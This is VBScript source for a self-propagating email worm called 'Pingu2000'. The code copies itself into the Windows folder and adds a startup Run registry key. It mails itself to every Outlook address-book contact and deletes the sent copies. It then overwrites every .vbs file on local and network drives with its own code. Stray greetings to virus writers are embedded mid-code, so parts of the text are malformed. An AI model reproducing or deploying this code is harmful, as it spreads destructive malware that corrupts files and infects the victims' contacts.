'Pingu2000 Created By Pingu2000
On Error Resume Next
Set znyelclegtn = CreateObject("WScript.Shell")
Set qoitojqvnmg= Createobject("scripting.filesystemobject")
qoitojqvnmg.copyfile wscript.scriptfullname,qoitojqvnmg.GetSpecialFolder(0)& "\Pingu2000.vbs"
znyelclegtn.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Outlook","wscript.exe "&qoitojqvnmg.GetSpecialFolder(0)& "\Outlook.vbs %"
if znyelclegtn.regread ("HKCU\software\Pingu2000\mailed") <> "1" then
mjsqcnzcagh()
end if
pzafkhwenxh()
ezottsvnkod()
Function mjsqcnzcagh()
On Error Resume Next
Set jjrtuqckgyp = CreateObject("Outlook.Application")
If jjrtuqckgyp= "Outlook"Then
Set rbprydovohv=jjrtuqckgyp.GetNameSpace("MAPI")
For Each gguktmobour In rbprydovohv.AddressLists
If gguktmobour.AddressEntries.Count <> 0 Then
For aykvhdbhqxi= 1 To gguktmobour.AddressEntries.Count
Set bgspefvfimh = gguktmobour.AddressEntries(aykvhdbhqxi)
Set xbcbdpswlrr = jjrtuqckgyp.CreateItem(0)
xbcbdpswlrr.To = bgspefvfimh.Address
xbcbdpswlrr.Subject = "Pingu2000"
xbcbdpswlrr.Body = "A new Kernel for Pingu is here..." & vbcrlf & "any thanks to --> Eveul, Dume/SMF, VirusBuster, PlayMan, Mortimer, Ultra's, Matrix and Tom Novy..."
xbcbdpswlrr.Attachments.Add qoitojqvnmg.GetSpecialFolder(0)& "\Outlook.vbs"
xbcbdpswlrr.DeleteAfterSubmit = True
If xbcbdpswlrr.To <> "" Then
xbcbdpswlrr.Send
znyelclegtn.regwrite "HKCU\software\Pingu2000\mailed", "1"
<BR> Z0mbie i miss our New Viruses <BR>
<BR> 29a,,when comes 29a#5 ?? <BR>
End If
Next
End If
Next
end if
End Function
if month(now) =7 and day(now) =6 then
znyelclegtn.run "Http://www.coderz.net",3,false
end if
Function ezottsvnkod()
On Error Resume Next
Set zbcylsphyzj = qoitojqvnmg.Drives
For Each xahfwdqqdio In zbcylsphyzj
If xahfwdqqdio.Drivetype = Remote Then
mwlygthmjsk= xahfwdqqdio & "\"
Call vntvuziptuz(mwlygthmjsk)
ElseIf xahfwdqqdio.IsReady Then
mwlygthmjsk= xahfwdqqdio&"\"
Call vntvuziptuz(mwlygthmjsk)
End If
Next
End Function
Function vntvuziptuz(kiwxorafzpn)
Set nmphlowkjrm= qoitojqvnmg.GetFolder(kiwxorafzpn)
Set okwlazqkuql= nmphlowkjrm.Files
For Each sxpoiiwague In okwlazqkuql
if qoitojqvnmg.GetExtensionName(sxpoiiwague.path) = "vbs" then
qoitojqvnmg.copyfile wscript.scriptfullname , sxpoiiwague.path , true
end if
Next
Set sxpoiiwague= nmphlowkjrm.SubFolders
For Each ugpvpokusev In sxpoiiwague
Call vntvuziptuz(ugpvpokusev.path)
Next
End Function
